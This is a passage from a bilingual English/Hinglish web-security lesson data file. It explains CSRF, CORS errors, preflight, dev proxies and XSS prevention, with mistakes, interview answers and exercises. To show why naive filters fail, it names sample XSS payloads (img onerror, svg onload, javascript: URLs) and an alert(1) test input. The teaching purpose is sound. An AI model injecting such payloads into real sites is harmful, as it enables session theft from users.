console.log('→ cookie is NOT sent on this cross-site POST');`,
        output: `Browser will attach bank.com cookies automatically
Bank sees: authenticated POST from a real logged-in session

Defence: Set-Cookie: session=…; SameSite=Lax
→ cookie is NOT sent on this cross-site POST`,
        explain: 'The attacker never reads anything — they do not need to. They just need the request to be *sent* with your credentials. `SameSite` breaks exactly that.',
        explainHi: 'Hamlavar kuch padhta hi nahi — usse zarurat hi nahi. Usse bas ye chahiye ki request aapke credentials ke saath *bhej* di jaye. `SameSite` bilkul isi ko toadta hai.',
      },
      {
        title: 'Reading the CORS error correctly',
        titleHi: 'CORS error sahi padhna',
        code: `try {
  const res = await fetch('https://api.other-site.com/data');
  console.log(await res.json());
} catch (err) {
  console.log('Caught:', err.message);
}

console.log('');
console.log('Network tab: the request WAS sent, status 200');
console.log('The browser blocked your JS from READING the response.');
console.log('Fix belongs on api.other-site.com, not here.');`,
        output: `Caught: Failed to fetch

Network tab: the request WAS sent, status 200
The browser blocked your JS from READING the response.
Fix belongs on api.other-site.com, not here.`,
        explain: 'The generic "Failed to fetch" hides what happened. Always check the Network tab — seeing a 200 there tells you immediately that this is CORS, not a broken endpoint.',
        explainHi: 'Generic "Failed to fetch" asli baat chhupa deta hai. Network tab hamesha dekho — wahan 200 dikhna turant bata deta hai ki ye CORS hai, toota endpoint nahi.',
      },
      {
        title: 'Simple versus preflighted',
        titleHi: 'Simple versus preflighted',
        code: `// Simple — sent straight away, no preflight
await fetch('https://api.com/data');
console.log('GET → no preflight');

// Preflighted — an OPTIONS request goes first
await fetch('https://api.com/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: '{}',
});
console.log('POST + JSON content-type → OPTIONS preflight first');
console.log('Server must answer the OPTIONS, or the POST never happens');`,
        output: `GET → no preflight
POST + JSON content-type → OPTIONS preflight first
Server must answer the OPTIONS, or the POST never happens`,
        explain: 'This explains the classic "my GET works but my POST fails". The POST needs the server to handle an OPTIONS request it may not have implemented at all.',
        explainHi: 'Isse classic "mera GET chalta hai par POST fail hota hai" samajh aata hai. POST ke liye server ko OPTIONS request sambhalni padti hai, jo shayad usne banayi hi na ho.',
      },
      {
        title: 'Cookies across origins need both sides',
        titleHi: 'Cross-origin cookies dono taraf se',
        code: `// ❌ cookies not sent by default cross-origin
await fetch('https://api.com/me');
console.log('no cookie sent → 401');

// ✅ client opts in
await fetch('https://api.com/me', { credentials: 'include' });
console.log('client opted in — but the server must too:');
console.log('  Access-Control-Allow-Credentials: true');
console.log('  Access-Control-Allow-Origin: https://exact-origin.com');
console.log('  (a wildcard * is rejected when credentials are used)');`,
        output: `no cookie sent → 401
client opted in — but the server must too:
  Access-Control-Allow-Credentials: true
  Access-Control-Allow-Origin: https://exact-origin.com
  (a wildcard * is rejected when credentials are used)`,
        explain: 'The wildcard rule catches everyone. `Allow-Origin: *` works fine until you add credentials, at which point the browser demands an exact origin.',
        explainHi: 'Wildcard wala niyam sabko pakadta hai. `Allow-Origin: *` theek chalta hai jab tak credentials na aayein, uske baad browser exact origin maangta hai.',
      },
      {
        title: 'A dev proxy sidesteps CORS',
        titleHi: 'Dev proxy CORS se bacha leta hai',
        code: `// vite.config.js
const config = {
  server: {
    proxy: { '/api': { target: 'http://localhost:4000', changeOrigin: true } },
  },
};

console.log('Browser calls:  /api/users        (same origin → no CORS)');
console.log('Vite forwards:  localhost:4000/api/users');
console.log('');
console.log('Server-to-server calls are not subject to CORS at all.');
console.log('Production still needs real CORS headers, or a same-origin deploy.');`,
        output: `Browser calls:  /api/users        (same origin → no CORS)
Vite forwards:  localhost:4000/api/users

Server-to-server calls are not subject to CORS at all.
Production still needs real CORS headers, or a same-origin deploy.`,
        explain: 'CORS is a browser rule, so routing through your own dev server removes the cross-origin situation entirely. Do not forget it is a dev-only fix.',
        explainHi: 'CORS browser ka niyam hai, isliye apne dev server se hokar jaane par cross-origin sthiti hi khatam ho jati hai. Ye sirf dev ka ilaaj hai, ye mat bhoolna.',
      },
    ],

    mistakes: [
      {
        wrong: `el.innerHTML = userInput;  // ❌ XSS`,
        right: `el.textContent = userInput;\n// or, if HTML is required:\nel.innerHTML = DOMPurify.sanitize(userInput);  // ✅`,
        why: '`innerHTML` parses and executes markup. Any user-controlled string becomes executable code with full access to the session.',
        whyHi: '`innerHTML` markup parse karke chalata hai. User ki control wali koi bhi string session tak poori pahunch wala chalne yogya code ban jati hai.',
      },
      {
        wrong: `const clean = input.replace(/<script>/gi, '');  // ❌ useless`,
        right: `const clean = DOMPurify.sanitize(input);  // ✅`,
        why: '`<img onerror>`, `<svg onload>` and `javascript:` URLs all execute without a script tag. Hand-rolled filters have been bypassed for two decades.',
        whyHi: '`<img onerror>`, `<svg onload>` aur `javascript:` URLs sab bina script tag ke chalte hain. Haath se bane filters do dashak se paar kiye ja rahe hain.',
      },
      {
        wrong: `// frontend: mode: 'no-cors'  ❌ gives you an unreadable opaque response`,
        right: `// backend: Access-Control-Allow-Origin: https://your-site.com  ✅`,
        why: '`no-cors` does not disable the policy — it returns an opaque response you cannot read at all. CORS can only be fixed on the server.',
        whyHi: '`no-cors` policy band nahi karta — wo aisa opaque response deta hai jise aap padh hi nahi sakte. CORS sirf server par theek ho sakta hai.',
      },
      {
        wrong: `const API_KEY = 'sk_live_abc123';  // ❌ in frontend code`,
        right: `// keep it server-side; the frontend calls YOUR endpoint  ✅`,
        why: 'Everything shipped to the browser is public — bundling and minifying hide nothing. Anyone can read it in the Network tab.',
        whyHi: 'Jo bhi browser tak jata hai wo public hai — bundling aur minifying kuch nahi chhupate. Koi bhi usse Network tab mein padh sakta hai.',
      },
    ],

    realWorld: [
      {
        en: '**Comment sections and rich text.** Any feature that renders user-authored content is an XSS surface. Editors like TipTap store structured JSON precisely so raw HTML never round-trips.',
        hi: '**Comment sections aur rich text.** Har wo feature jo user ka likha content dikhata hai XSS ka rasta hai. TipTap jaise editors structured JSON isiliye rakhte hain taaki kachchi HTML kabhi aage-peeche na ghoome.',
      },
      {
        en: '**Every new frontend project.** The first CORS error usually arrives on day one, when a Vite app on port 5173 calls an API on port 4000.',
        hi: '**Har naye frontend project mein.** Pehla CORS error aksar pehle hi din aata hai, jab port 5173 ka Vite app port 4000 ke API ko call karta hai.',
      },
      {
        en: '**Session design.** The localStorage-versus-httpOnly-cookie debate is exactly the XSS-versus-CSRF trade-off, which is why `SameSite` cookies plus a CSP is the usual recommendation.',
        hi: '**Session design.** localStorage-versus-httpOnly-cookie ki behes bilkul XSS-versus-CSRF ka sauda hai, isiliye aam salah `SameSite` cookies aur CSP ki hoti hai.',
      },
    ],

    interviewQA: [
      {
        q: 'What is XSS and how do you prevent it?',
        qHi: 'XSS kya hai aur usse kaise rokte hain?',
        a: 'Cross-Site Scripting: an attacker gets their JavaScript executing in the context of your origin, giving it access to cookies, storage and the user\'s session. Prevent it by never inserting untrusted data into HTML sinks — use `textContent` instead of `innerHTML`, sanitise with DOMPurify when HTML is genuinely needed, validate URL protocols, and deploy a Content Security Policy as defence in depth.',
        aHi: 'Cross-Site Scripting: hamlavar apna JavaScript aapke origin ke context mein chala leta hai, jisse usse cookies, storage aur user ke session tak pahunch mil jati hai. Rokne ke liye bharose ke laayak na data kabhi HTML mein mat daalo — `innerHTML` ke bajaye `textContent`, HTML sach mein chahiye to DOMPurify, URL protocols validate karo, aur defence in depth ke liye Content Security Policy lagao.',
      },
      {
        q: 'Why is stripping `<script>` tags not enough?',
        qHi: '`<script>` tags hataana kaafi kyun nahi hai?',
        a: 'Because most XSS payloads do not use one. `<img src=x onerror=…>`, `<svg onload=…>`, `<body onload=…>` and `javascript:` URLs all execute. There are also encoding and nesting tricks that defeat naive filters. Use a maintained sanitiser or avoid HTML entirely.',
        aHi: 'Kyunki zyadatar XSS payloads usse use hi nahi karte. `<img src=x onerror=…>`, `<svg onload=…>`, `<body onload=…>` aur `javascript:` URLs sab chalte hain. Encoding aur nesting ke aise tarike bhi hain jo seedhe filters ko paar kar lete hain. Maintained sanitiser use karo ya HTML se poori tarah bacho.',
      },
      {
        q: 'What is CSRF and how does `SameSite` stop it?',
        qHi: 'CSRF kya hai aur `SameSite` usse kaise rokta hai?',
        a: 'CSRF tricks a logged-in user\'s browser into sending a state-changing request to your site; the browser attaches the session cookie automatically, so the request looks authentic. `SameSite=Lax` tells the browser not to send that cookie on cross-site POST requests, so the forged request arrives unauthenticated and is rejected.',
        aHi: 'CSRF logged-in user ke browser se aapki site par state badalne wali request bhijwa deta hai; browser session cookie apne aap chipka deta hai, isliye request asli lagti hai. `SameSite=Lax` browser se kehta hai ki cross-site POST par wo cookie mat bhejo, isliye jaali request bina authentication ke pahunchti hai aur reject ho jati hai.',
      },
      {
        q: 'What exactly is CORS blocking, and why does Postman work?',
        qHi: 'CORS asal mein kya rokta hai, aur Postman kyun chalta hai?',
        a: 'CORS is a browser-enforced policy stopping a page on one origin from **reading** a response from another. The request is usually sent and answered normally — only your JavaScript is denied access to the result. Postman is not a browser, has no origin and no same-origin policy to enforce, so it never applies. The fix must be server-side headers.',
        aHi: 'CORS browser dwara lagu ek policy hai jo ek origin ke page ko doosre ka response **padhne** se rokti hai. Request aksar theek bhej di jati hai aur jawab bhi aata hai — sirf aapke JavaScript ko result tak pahunch nahi milti. Postman browser hai hi nahi, uska koi origin nahi aur koi same-origin policy lagu karne ko nahi, isliye wo kabhi lagti hi nahi. Ilaaj server-side headers hi hain.',
      },
      {
        q: 'What triggers a CORS preflight?',
        qHi: 'CORS preflight kab hota hai?',
        a: 'Anything that is not a "simple" request: methods other than GET, HEAD or POST; a `Content-Type` other than form-encoded, multipart or plain text; or any custom header such as `Authorization`. The browser sends an `OPTIONS` request first and only proceeds if the server approves the method and headers.',
        aHi: 'Har wo cheez jo "simple" request nahi hai: GET, HEAD ya POST ke alawa koi method; form-encoded, multipart ya plain text ke alawa koi `Content-Type`; ya koi bhi custom header jaise `Authorization`. Browser pehle `OPTIONS` request bhejta hai aur tabhi aage badhta hai jab server method aur headers ko manzoori de.',
      },
    ],

    exercises: [
      {
        task: 'Build a comment box that renders user input safely. Try posting `<img src=x onerror="alert(1)">` and prove with `children.length` that no element was created.',
        taskHi: 'Aisa comment box banao jo user input safely dikhaye. `<img src=x onerror="alert(1)">` post karke dekho aur `children.length` se sabit karo ki koi element nahi bana.',
        hint: '`textContent` is the entire fix. Then switch it to `innerHTML` once to see the alert fire, so the difference is concrete.',
        hintHi: '`textContent` hi poora ilaaj hai. Phir ek baar `innerHTML` karke alert chalte dekho, taaki fark thos lage.',
      },
      {
        task: 'Write `safeLink(url, text)` returning an anchor element that refuses `javascript:` and `data:` URLs, falling back to `#`.',
        taskHi: '`safeLink(url, text)` likho jo aisa anchor element de jo `javascript:` aur `data:` URLs mana kar de aur `#` par gir jaye.',
        hint: 'Parse with `new URL(url, location.origin)` and allow-list the protocol. Wrap it in try/catch since invalid URLs throw.',
        hintHi: '`new URL(url, location.origin)` se parse karo aur protocol ki allow-list banao. try/catch mein rakho kyunki galat URLs throw karte hain.',
      },
      {
        task: 'Reproduce a CORS error by fetching a public API from a local page. Read the exact console message, confirm in the Network tab that the request was actually sent, then fix it with a dev proxy.',
        taskHi: 'Local page se koi public API fetch karke CORS error paida karo. Console ka poora message padho, Network tab mein confirm karo ki request sach mein gayi thi, phir dev proxy se theek karo.',
        hint: 'Seeing a 200 in the Network tab while your `catch` runs is the moment CORS actually clicks.',
        hintHi: 'Network tab mein 200 dikhna aur saath hi aapka `catch` chalna — CORS bilkul isi pal samajh aata hai.',
      },
    ],

    keyTakeaways: [
      'XSS is someone else\'s JavaScript running as your site — never put untrusted text into `innerHTML`.',
      'Most XSS payloads need no `<script>` tag; filtering for one is not sanitisation.',
      'CSRF works because cookies are attached automatically — `SameSite=Lax` is the primary defence.',
      'CORS blocks your page from READING a cross-origin response; the request was usually sent fine.',
      'CORS can only be fixed server-side. `mode: "no-cors"` gives an unreadable response, not a fix.',
      'Anything shipped to the browser is public. Secrets and authorisation belong on the server.',
    ],
    keyTakeawaysHi: [
      'XSS matlab kisi aur ka JavaScript aapki site bankar chalna — bharose ke laayak na text kabhi `innerHTML` mein mat daalo.',
      'Zyadatar XSS payloads ko `<script>` tag chahiye hi nahi; usse chhaanna sanitisation nahi hai.',
      'CSRF isliye chalta hai kyunki cookies apne aap chipakti hain — mukhya bachaav `SameSite=Lax` hai.',
      'CORS aapke page ko cross-origin response PADHNE se rokta hai; request aksar theek chali jati hai.',
      'CORS sirf server par theek hota hai. `mode: "no-cors"` na-padhne-yogya response deta hai, ilaaj nahi.',
      'Jo bhi browser tak jata hai wo public hai. Secrets aur authorisation server par hi rakho.',
    ],
  },
];
